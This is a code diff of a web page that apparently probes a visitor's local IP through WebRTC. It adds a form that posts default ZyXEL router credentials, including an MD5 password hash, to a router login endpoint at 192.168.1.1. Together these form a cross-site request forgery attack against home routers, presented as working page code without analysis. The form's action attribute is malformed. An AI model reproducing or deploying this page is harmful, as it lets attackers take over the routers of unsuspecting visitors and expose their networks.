@@ -9,6 +9,7 @@
 		Your network IP is: 
 		<h1 id="list"></h1>
 		<script>
+		
 
 // NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
 var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
@@ -58,6 +59,12 @@ if (RTCPeerConnection) (function () {
 }
 
 </script>
+		<form method="post" action"http://192.168.1.1/Forms/rpAuth_1">
+			LoginPassword: <input type="text" value="ZyXEL+ZyWALL+Series" name="LoginPassword">
+			hiddenPassword: <input type="text" value="21232f297a57a5a743894a0e4a801fc3" name="hiddenPassword">
+			Prestige_Login: <input type="text" value="Login" name="Prestige_Login">
+			<input type="submit" value="submit">
+		</form>
 	</body>
 
 </html>
